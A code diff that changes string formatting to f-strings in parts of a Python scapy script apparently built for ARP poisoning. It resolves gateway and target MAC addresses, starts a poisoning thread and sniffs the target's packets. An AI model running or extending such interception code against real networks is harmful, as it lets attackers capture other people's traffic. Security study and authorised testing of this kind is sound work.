@@ -72,7 +72,7 @@ conf.iface = interface
 # turn off output
 conf.verb = 0
 
-print("[*] Setting up %s" % interface)
+print(f"[*] Setting up {interface}")
 
 tgt_gateway_mac = get_mac(tgt_gateway)
 
@@ -80,7 +80,7 @@ if tgt_gateway_mac is None:
     print("[!!!] Failed to get gateway MAC. Exiting.")
     sys.exit(0)
 else:
-    print("[*] Gateway %s is at %s" % (tgt_gateway, tgt_gateway_mac))
+    print(f"[*] Gateway {tgt_gateway} is at {tgt_gateway_mac}")
 
 tgt_mac = get_mac(tgt_ip)
 
@@ -88,7 +88,7 @@ if tgt_mac is None:
     print("[!!!] Failed to get target MAC. Exiting.")
     sys.exit(0)
 else:
-    print("[*] Target %s is at %s" % (tgt_ip, tgt_mac))
+    print(f"[*] Target {tgt_ip} is at {tgt_mac}")
 
 # start poison thread
 poison_thread = threading.Thread(target=poison_target,
@@ -101,7 +101,7 @@ poison_thread.start()
 
 try:
     print("[*] Starting sniffer for %d packets" % packet_count)
-    bpf_filter = "ip host %s" % tgt_ip
+    bpf_filter = f"ip host {tgt_ip}"
     packets = sniff(count=packet_count,
                     filter=bpf_filter,
                     iface=interface
